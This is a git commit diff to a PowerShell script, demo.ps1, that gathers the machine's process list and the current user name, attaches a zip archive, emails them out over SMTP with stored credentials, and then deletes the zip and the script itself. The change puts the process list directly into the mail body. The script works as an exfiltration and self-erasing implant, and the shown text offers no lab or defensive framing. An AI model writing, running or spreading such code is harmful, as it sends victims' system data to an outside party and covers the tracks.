3bcadadbcbf03e5884698b9aba84c65138327877
hkslover <hk_snow@yeah.net>
2020-05-25 12:43:12 +0800

    update file/demo.ps1.

--- file/demo.ps1
+++ file/demo.ps1
@@ -1,4 +1,4 @@
-get-process >> process.txt
+$process = get-process
 $whoami = whoami
 
 
@@ -32,19 +32,14 @@ $mail.To.Add($MailtoAddress)
 #set the content
 $mail.Subject = $whoami;
 $mail.Priority = "High"
-$mail.Body = "Hello Powershell"
-$filename="process.txt"	#add file
+$mail.Body = $process
+$filename="bakcup.zip"	#add file
 $attachment = new-Object System.Net.Mail.Attachment($filename)
-
-$filename1 = 'bakcup.zip'
-$attachment1 = new-Object System.Net.Mail.Attachment($filename1)
 $mail.Attachments.Add($attachment)
-$mail.Attachments.Add($attachment1)
 #send the message
 $smtp = New-Object System.Net.Mail.SmtpClient -argumentList $smtpServer
 $smtp.Credentials = New-Object System.Net.NetworkCredential -argumentList $smtpUser,$smtpPassword
 $smtp.Send($mail)
 $main.Attachments.Dispose()
 remove-item $MyInvocation.MyCommand.Path -force
-remove-item 'process.txt'
 remove-item 'bakcup.zip'
